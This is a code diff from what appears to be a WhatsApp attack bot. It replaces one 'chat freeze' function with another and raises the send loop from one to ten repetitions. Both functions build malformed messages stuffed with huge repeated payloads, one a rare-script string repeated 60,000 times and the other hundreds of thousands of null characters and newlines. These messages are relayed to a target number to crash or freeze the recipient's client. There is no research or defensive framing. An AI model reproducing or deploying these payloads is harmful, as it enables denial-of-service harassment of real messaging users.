@@ -3394,12 +3394,12 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 10; i++) {
                 try {
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await CmlFrezeChat(sock, target);
+                    await VnXNewOnlyBulldo(sock, target);
                     await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4443,34 +4443,23 @@ async function Vdelay(sock, target) {
   }
 }
 
-async function CmlFrezeChat(sock, target) {
-try {
-  const cmlMsg = {
-   viewOnceMessage: {
-    message: {
-     interactiveResponseMessage: {
-        body: {
-          text: "Cml",
-          format: 1
-        },
-        nativeFlowResponseMessage: {
-          name: "galaxy_message",
-          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"𑇂𑆵𑆴𑆿".repeat(60000)}}}`,
-          version: 3,
-        }
-     }
-   }
-  }
-}
-    await sock.relayMessage(target, cmlMsg, {
-      participant: { jid: target }
-    });
-    
-    console.log(`✅ Work Jir Sukses Sent To: ${target}`);
-    
-  } catch (err) {
-    console.error(`❌ Error Cok Lapor @CamelOffc: ${err.message}`);
-  }
+async function VnXNewOnlyBulldo(sock, target) {
+    const MsgNew = {
+        groupStatusMessageV2: {
+            message: {
+                extendedTextMessage: {
+                    text: "\0".repeat(250000) + "\n".repeat(25000) + "\u0000".repeat(250000),
+                }
+            }
+        }
+    };
+    
+    try {
+        await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
+        console.log('message success to ${target}');
+    } catch (e) {
+        console.log("❌ Error Strike:", e);
+    }
 }
 
 async function VogueDelay(sock, target) {
